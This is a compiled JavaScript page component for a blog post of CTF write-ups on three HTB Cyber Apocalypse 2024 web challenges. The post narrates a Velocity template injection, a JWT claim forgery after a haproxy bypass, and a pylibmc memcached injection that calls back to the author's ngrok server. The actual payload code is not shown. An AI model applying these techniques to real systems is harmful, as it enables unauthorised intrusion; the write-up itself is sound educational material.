ne=r(us);ba=p(ne,"1.7"),ne.forEach(l),Ca=p(ds,":"),ds.forEach(l),Ol=i(s),hs=E(s,!1),As=i(s),K=t(s,"P",{});var pe=r(K);Ia=p(pe,"The specified version was quite an outdated version of the library. Now, first thing i did was try to read the code and look for any SSTIs."),pe.forEach(l),Jl=i(s),ws=E(s,!1),_s=i(s),T=t(s,"P",{});var da=r(T);ka=p(da,"So, we definitely are replacing the the word "),gs=t(da,"CODE",{});var Fe=r(gs);Sa=p(Fe,"TEXT"),Fe.forEach(l),Ta=p(da," with the our input. And later on this code was processed here:"),da.forEach(l),Bl=i(s),bs=E(s,!1),Cs=i(s),v=t(s,"P",{});var u=r(v);xa=p(u,"At first i confirmed the injection by providing the "),Is=t(u,"CODE",{});var te=r(Is);ja=p(te,"$name"),te.forEach(l),Xa=p(u," value to the "),ks=t(u,"CODE",{});var re=r(ks);Ma=p(re,"text"),re.forEach(l),Na=p(u," parameter and it replaced it with "),Ss=t(u,"CODE",{});var ce=r(Ss);Oa=p(ce,"world"),ce.forEach(l),Ja=p(u,". Now, doing a bit of googling, i discovered a "),Ts=t(u,"CODE",{});var ie=r(Ts);Ba=p(ie,"CVE"),ie.forEach(l),za=p(u," for this specific version of "),xs=t(u,"CODE",{});var ye=r(xs);Ra=p(ye,"Velocity"),ye.forEach(l),Pa=p(u,`.
I used the following payload with the name param`),u.forEach(l),zl=i(s),js=E(s,!1),Xs=i(s),ss=t(s,"P",{});var De=r(ss);Ua=p(De,"I used curl to execute the payload and got the right execution:"),De.forEach(l),Rl=i(s),Ms=E(s,!1),Ns=i(s),x=t(s,"P",{});var Ea=r(x);Ha=p(Ea,"However, i had a hard time getting the flag since i wasn’t able to get a reverse shell or place some special characters in the command. This seemed like a dead end for a second. But then i fired up "),Os=t(Ea,"CODE",{});var de=r(Os);Ga=p(de,"sstimap"),de.forEach(l),qa=p(Ea,` against it.
And to my surprise i was able to get an OS Shell directly without having to do the CVE exploit:`),Ea.forEach(l),Pl=i(s),Js=E(s,!1),Bs=i(s),ls=t(s,"P",{});var Ee=r(ls);Va=p(Ee,"Get the flag"),Ee.forEach(l),Ul=i(s),zs=E(s,!1),Rs=i(s),R=t(s,"H3",{id:!0});var ve=r(R);as=t(ve,"A",{href:!0});var fe=r(as);Wa=p(fe,"LockTalk"),fe.forEach(l),ve.forEach(l),Hl=i(s),os=t(s,"P",{});var me=r(os);$a=p(me,"It was a flask application with haproxy in front of the application. Reviewing the code, i found 3 APIs that i can request:"),me.forEach(l),Gl=i(s),Ps=E(s,!1),Us=i(s),b=t(s,"P",{});var Es=r(b);Qa=p(Es,"The goal here is to generate a ticket and somehow modify the claim so that the role we use is of administrator. However, we can’t simply request the "),Hs=t(Es,"CODE",{});var ue=r(Hs);La=p(ue,"/get_ticket"),ue.forEach(l),Za=p(Es," api because of "),Gs=t(Es,"CODE",{});var he=r(Gs);Ya=p(he,"haproxy"),he.forEach(l),Ka=p(Es,":"),Es.forEach(l),ql=i(s),qs=E(s,!1),Vs=i(s),es=t(s,"P",{});var Ae=r(es);so=p(Ae,"I bypassed the filter rule with the simple listing:"),Ae.forEach(l),Vl=i(s),Ws=E(s,!1),$s=i(s),j=t(s,"P",{});var va=r(j);lo=p(va,"The above returned me with the "),Qs=t(va,"CODE",{});var we=r(Qs);ao=p(we,"JWT"),we.forEach(l),oo=p(va," token needed."),va.forEach(l),Wl=i(s),Ls=E(s,!1),Zs=i(s),X=t(s,"P",{});var fa=r(X);eo=p(fa,"Now, checking the requirements of project, i found "),Ys=t(fa,"CODE",{});var _e=r(Ys);no=p(_e,"python_jwt==3.3.3"),_e.forEach(l),po=p(fa,":"),fa.forEach(l),$l=i(s),Ks=E(s,!1),sl=i(s),P=t(s,"P",{});var Qo=r(P);Fo=p(Qo,"Heading to google, i found a security advisory of the project on Github: "),M=t(Qo,"A",{href:!0,rel:!0,target:!0});var ge=r(M);to=p(ge,"https://github.com/davedoesdev/python-jwt/security/advisories/GHSA-5p8v-58qm-c7fp"),ge.forEach(l),Qo.forEach(l),Ql=i(s),U=t(s,"P",{});var Lo=r(U);ro=p(Lo,"It seems as if i can modify the claims of the JWT for versions "),ll=t(Lo,"CODE",{});var be=r(ll);co=p(be,"<3.3.4"),be.forEach(l),Lo.forEach(l),Ll=i(s),ns=t(s,"P",{});var Ce=r(ns);Tl(H.$$.fragment,Ce),Ce.forEach(l),Zl=i(s),N=t(s,"P",{});var ma=r(N);io=p(ma,"In one of the commits of the repo of fixing this issue i found a code that i the modified to write my own exploit. Make sure to replace the token in the "),al=t(ma,"CODE",{});var Ie=r(al);yo=p(Ie,"create"),Ie.forEach(l),Do=p(ma," method:"),ma.forEach(l),Yl=i(s),ol=E(s,!1),el=i(s),ps=t(s,"P",{});var ke=r(ps);Eo=p(ke,"I ran the code and got the following payload:"),ke.forEach(l),Kl=i(s),nl=E(s,!1),pl=i(s),Fs=t(s,"P",{});var Se=r(Fs);vo=p(Se,"Note that we need to place the payload as it is as our new JWT token to make it work:"),Se.forEach(l),sa=i(s),Fl=E(s,!1),tl=i(s),ts=t(s,"P",{});var Te=r(ts);fo=p(Te,"And got the flag:"),Te.forEach(l),la=i(s),rl=E(s,!1),cl=i(s),G=t(s,"H3",{id:!0});var xe=r(G);rs=t(xe,"A",{href:!0});var je=r(rs);mo=p(je,"SerialFlow"),je.forEach(l),xe.forEach(l),aa=i(s),C=t(s,"P",{});var vs=r(C);uo=p(vs,"Analyzing the code of the application, i got that application is using the library "),il=t(vs,"CODE",{});var Xe=r(il);ho=p(Xe,"flask-session"),Xe.forEach(l),Ao=p(vs," with "),yl=t(vs,"CODE",{});var Me=r(yl);wo=p(Me,"pylibmc"),Me.forEach(l),_o=p(vs," to store sessions in memcached."),vs.forEach(l),oa=i(s),Dl=E(s,!1),dl=i(s),k=t(s,"P",{});var kl=r(k);go=p(kl,"At this point, i thougt it would be a plain memcached injection but nothing. Doing a bit of google i found various articles on memcached injection with other libraries from Python. However, i found this one blog on "),El=t(kl,"CODE",{});var Ne=r(El);bo=p(Ne,"pylibmc"),Ne.forEach(l),Co=p(kl," exploitation: "),O=t(kl,"A",{href:!0,rel:!0,target:!0});var Oe=r(O);Io=p(Oe,"https://btlfry.gitlab.io/notes/posts/memcached-command-injections-at-pylibmc/"),Oe.forEach(l),kl.forEach(l),ea=i(s),I=t(s,"P",{});var fs=r(I);ko=p(fs,"Reading the blog, i got that we can do a memcached injection with "),vl=t(fs,"CODE",{});var Je=r(vl);So=p(Je,"pylibmc"),Je.forEach(l),To=p(fs," by using carriage return line breaks by encoding the payload in a special sequence that is being understood by the HTTP protocol. However, the tricky part for me was to identify where to place the payload. In the blog, the author used a cookie named "),fl=t(fs,"CODE",{});var Be=r(fl);xo=p(Be,"notsecret"),Be.forEach(l),jo=p(fs," which i wasn’t sure of. After spending some more time on this, i found the author’s twitter where he attached a GIF of the exploit and used it as the session cookie."),fs.forEach(l),na=i(s),J=t(s,"P",{});var ua=r(J);Xo=p(ua,"The good thing was we got the exploit code from the blog. I modified it a bit to send request to my "),ml=t(ua,"CODE",{});var ze=r(ml);Mo=p(ze,"ngrok"),ze.forEach(l),No=p(ua," server:"),ua.forEach(l),pa=i(s),ul=E(s,!1),hl=i(s),q=t(s,"P",{});var Zo=r(q);Oo=p(Zo,`The payload i got looked something like this:
`),Tl(V.$$.fragment,Zo),Zo.forEach(l),Fa=i(s),W=t(s,"P",{});var Yo=r(W);Jo=p(Yo,`As per the HTTP specs, we need send it with double quotes as the session cookie. I used burp:
`),Tl($.$$.fragment,Yo),Yo.forEach(l),ta=i(s),m=t(s,"P",{});var S=r(m);Bo=p(S,"At first it returned me a "),Al=t(S,"CODE",{});var Re=r(Al);zo=p(Re,"200"),Re.forEach(l),Ro=p(S," response. While i should have gotten an "),wl=t(S,"CODE",{});var Pe=r(wl);Po=p(Pe,"Internal Server Error"),Pe.forEach(l),Uo=p(S,". Running it a couple times, returned me a request on my "),_l=t(S,"CODE",{});var Ue=r(_l);Ho=p(Ue,"ngrok"),Ue.forEach(l),Go=p(S,` terminal:
`),Tl(Q.$$.fragment,S),S.forEach(l),ra=i(s),cs=t(s,"P",{});var He=r(cs);qo=p(He,"So, i modified the exploit a bit to get the flag:"),He.forEach(l),ca=i(s),gl=E(s,!1),bl=i(s),is=t(s,"P",{});var Ge=r(is);Vo=p(Ge,"I sent the request second and got the response on terminal:"),Ge.forEach(l),ia=i(s),Cl=E(s,!1),Il=i(s),L=t(s,"H2",{id:!0});var qe=r(L);ys=t(qe,"A",{href:!0});var Ve=r(ys);Wo=p(Ve,"Ending Note"),Ve.forEach(l),qe.forEach(l),ya=i(s),Ds=t(s,"P",{});var We=r(Ds);$o=p(We,"Overall, it was really fun playing the CTF and just like any other time, i got new things to learn :)"),We.forEach(l),this.h()},h(){f(D,"href","#web"),f(h,"id","web"),f(Y,"href","#labyrinth-linguist---easy"),f(z,"id","labyrinth-linguist---easy"),hs.a=As,ws.a=_s,bs.a=Cs,js.a=Xs,Ms.a=Ns,Js.a=Bs,zs.a=Rs,f(as,"href","#locktalk"),f(R,"id","locktalk"),Ps.a=Us,qs.a=Vs,Ws.a=$s,Ls.a=Zs,Ks.a=sl,f(M,"href","https://github.com/davedoesdev/python-jwt/security/advisories/GHSA-5p8v-58qm-c7fp"),f(M,"rel","nofollow noopener noreferrer external"),f(M,"target","_blank"),ol.a=el,nl.a=pl,Fl.a=tl,rl.a=cl,f(rs,"href","#serialflow"),f(G,"id","serialflow"),Dl.a=dl,f(O,"href","https://btlfry.gitlab.io/notes/posts/memcached-command-injections-at-pylibmc/"),f(O,"rel","nofollow noopener noreferrer external"),f(O,"target","_blank"),ul.a=hl,gl.a=bl,Cl.a=Il,f(ys,"href","#ending-note"),f(L,"id","ending-note")},m(s,o){e(s,y,o),a(y,w),e(s,_,o),e(s,h,o),a(h,D),a(D,A),e(s,B,o),e(s,z,o),a(z,Y),a(Y,Aa),e(s,Nl,o),e(s,g,o),a(g,wa),a(g,ms),a(ms,_a),a(g,ga),a(g,us),a(us,ba),a(g,Ca),e(s,Ol,o),hs.m(Ze,s,o),e(s,As,o),e(s,K,o),a(K,Ia),e(s,Jl,o),ws.m(Ye,s,o),e(s,_s,o),e(s,T,o),a(T,ka),a(T,gs),a(gs,Sa),a(T,Ta),e(s,Bl,o),bs.m(Ke,s,o),e(s,Cs,o),e(s,v,o),a(v,xa),a(v,Is),a(Is,ja),a(v,Xa),a(v,ks),a(ks,Ma),a(v,Na),a(v,Ss),a(Ss,Oa),a(v,Ja),a(v,Ts),a(Ts,Ba),a(v,za),a(v,xs),a(xs,Ra),a(v,Pa),e(s,zl,o),js.m(sn,s,o),e(s,Xs,o),e(s,ss,o),a(ss,Ua),e(s,Rl,o),Ms.m(ln,s,o),e(s,Ns,o),e(s,x,o),a(x,Ha),a(x,Os),a(Os,Ga),a(x,qa),e(s,Pl,o),Js.m(an,s,o),e(s,Bs,o),e(s,ls,o),a(ls,Va),e(s,Ul,o),zs.m(on,s,o),e(s,Rs,o),e(s,R,o),a(R,as),a(as,Wa),e(s,Hl,o),e(s,os,o),a(os,$a),e(s,Gl,o),Ps.m(en,s,o),e(s,Us,o),e(s,b,o),a(b,Qa),a(b,Hs),a(Hs,La),a(b,Za),a(b,Gs),a(Gs,Ya),a(b,Ka),e(s,ql,o),qs.m(nn,s,o),e(s,Vs,o),e(s,es,o),a(es,so),e(s,Vl,o),Ws.m(pn,s,o),e(s,$s,o),e(s,j,o),a(j,lo),a(j,Qs),a(Qs,ao),a(j,oo),e(s,Wl,o),Ls.m(Fn,s,o),e(s,Zs,o),e(s,X,o),a(X,eo),a(X,Ys),a(Ys,no),a(X,po),e(s,$l,o),Ks.m(tn,s,o),e(s,sl,o),e(s,P,o),a(P,Fo),a(P,M),a(M,to),e(s,Ql,o),e(s,U,o),a(U,ro),a(U,ll),a(ll,co),e(s,Ll,o),e(s,ns,o),xl(H,ns,null),e(s,Zl,o),e(s,N,o),a(N,io),a(N,al),a(al,yo),a(N,Do),e(s,Yl,o),ol.m(rn,s,o),e(s,el,o),e(s,ps,o),a(ps,Eo),e(s,Kl,o),nl.m(cn,s,o),e(s,pl,o),e(s,Fs,o),a(Fs,vo),e(s,sa,o),Fl.m(yn,s,o),e(s,tl,o),e(s,ts,o),a(ts,fo),e(s,la,o),rl.m(Dn,s,o),e(s,cl,o),e(s,G,o),a(G,rs),a(rs,mo),e(s,aa,o),e(s,C,o),a(C,uo),a(C,il),a(il,ho),a(C,Ao),a(C,yl),a(yl,wo),a(C,_o),e(s,oa,o),Dl.m(dn,s,o),e(s,dl,o),e(s,k,o),a(k,go),a(k,El),a(El,bo),a(k,Co),a(k,O),a(O,Io),e(s,ea,o),e(s,I,o),a(I,ko),a(I,vl),a(vl,So),a(I,To),a(I,fl),a(fl,xo),a(I,jo),e(s,na,o),e(s,J,o),a(J,Xo),a(J,ml),a(ml,Mo),a(J,No),e(s,pa,o),ul.m(En,s,o),e(s,hl,o),e(s,q,o),a(q,Oo),xl(V,q,null),e(s,Fa,o),e(s,W,o),a(W,Jo),xl($,W,null),e(s,ta,o),e(s,m,o),a(m,Bo),a(m,Al),a(Al,zo),a(m,Ro),a(m,wl),a(wl,Po),a(m,Uo),a(m,_l),a(_l,Ho),a(m,Go),xl(Q,m,null),e(s,ra,o),e(s,cs,o),a(cs,qo),e(s,ca,o),gl.m(vn,s,o),e(s,bl,o),e(s,is,o),a(is,Vo),e(s,ia,o),Cl.m(fn,s,o),e(s,Il,o),e(s,L,o),a(L,ys),a(ys,Wo),e(s,ya,o),e(s,Ds,o),a(Ds,$o),Da=!0},p:wn,i(s){Da||(jl(H.$$.fragment,s),jl(V.$$.fragment,s),jl($.$$.fragment,s),jl(Q.$$.fragment,s),Da=!0)},o(s){Xl(H.$$.fragment,s),Xl(V.$$.fragment,s),Xl($.$$.fragment,s),Xl(Q.$$.fragment,s),Da=!1},d(s){s&&l(y),s&&l(_),s&&l(h),s&&l(B),s&&l(z),s&&l(Nl),s&&l(g),s&&l(Ol),s&&hs.d(),s&&l(As),s&&l(K),s&&l(Jl),s&&ws.d(),s&&l(_s),s&&l(T),s&&l(Bl),s&&bs.d(),s&&l(Cs),s&&l(v),s&&l(zl),s&&js.d(),s&&l(Xs),s&&l(ss),s&&l(Rl),s&&Ms.d(),s&&l(Ns),s&&l(x),s&&l(Pl),s&&Js.d(),s&&l(Bs),s&&l(ls),s&&l(Ul),s&&zs.d(),s&&l(Rs),s&&l(R),s&&l(Hl),s&&l(os),s&&l(Gl),s&&Ps.d(),s&&l(Us),s&&l(b),s&&l(ql),s&&qs.d(),s&&l(Vs),s&&l(es),s&&l(Vl),s&&Ws.d(),s&&l($s),s&&l(j),s&&l(Wl),s&&Ls.d(),s&&l(Zs),s&&l(X),s&&l($l),s&&Ks.d(),s&&l(sl),s&&l(P),s&&l(Ql),s&&l(U),s&&l(Ll),s&&l(ns),Ml(H),s&&l(Zl),s&&l(N),s&&l(Yl),s&&ol.d(),s&&l(el),s&&l(ps),s&&l(Kl),s&&nl.d(),s&&l(pl),s&&l(Fs),s&&l(sa),s&&Fl.d(),s&&l(tl),s&&l(ts),s&&l(la),s&&rl.d(),s&&l(cl),s&&l(G),s&&l(aa),s&&l(C),s&&l(oa),s&&Dl.d(),s&&l(dl),s&&l(k),s&&l(ea),s&&l(I),s&&l(na),s&&l(J),s&&l(pa),s&&ul.d(),s&&l(hl),s&&l(q),Ml(V),s&&l(Fa),s&&l(W),Ml($),s&&l(ta),s&&l(m),Ml(Q),s&&l(ra),s&&l(cs),s&&l(ca),s&&gl.d(),s&&l(bl),s&&l(is),s&&l(ia),s&&Cl.d(),s&&l(Il),s&&l(L),s&&l(ya),s&&l(Ds)}}}function bn(Z){let y,w;const _=[Z[0],Le];let h={$$slots:{default:[gn]},$$scope:{ctx:Z}};for(let D=0;D<_.length;D+=1)h=Ko(h,_[D]);return y=new _n({props:h}),{c(){Sl(y.$$.fragment)},l(D){Tl(y.$$.fragment,D)},m(D,A){xl(y,D,A),w=!0},p(D,[A]){const B=A&1?An(_,[A&1&&$e(D[0]),A&0&&$e(Le)]):{};A&2&&(B.$$scope={dirty:A,ctx:D}),y.$set(B)},i(D){w||(jl(y.$$.fragment,D),w=!0)},o(D){Xl(y.$$.fragment,D),w=!1},d(D){Ml(y,D)}}}const Le={title:"Writeups for Web challenges from HTB Cyber Apocalypse CTF 2024",tags:["ctf","cyber-apocalypse","htb","htb-2024","web"],categories:["CTF","Writeups"],summary:"This blog post contains the writeups for the web challenges that i solved from HTB Cyber Apocalypse 2024",created:"2024-03-14T00:00:00.000Z",lastmod:"2024-03-14T00:00:00.000Z",image:"https://github.com/hash3liZer/khatta/assets/29171692/d5abad92-0b61-4418-af4b-582a6d03044b",flags:[],updated:"2025-03-21T09:46:48.176Z",slug:"/blog/2023/htb-cyber-apocalypse-ctf-2024-web-writeups/+page.md",path:"/blog/2023/htb-cyber-apocalypse-ctf-2024-web-writeups",toc:[{depth:2,title:"WEB",slug:"web"},{depth:3,title:"Labyrinth Linguist - Easy",slug:"labyrinth-linguist---easy"},{depth:3,title:"LockTalk",slug:"locktalk"},{depth:3,title:"SerialFlow",slug:"serialflow"},{depth:2,title:"Ending Note",slug:"ending-note"}]};function Cn(Z,y,w){return Z.$$set=_=>{w(0,y=Ko(Ko({},y),Qe(_)))},y=Qe(y),[y]}class Tn extends mn{constructor(y){super(),un(this,y,Cn,bn,hn,{})}}export{Tn as component};
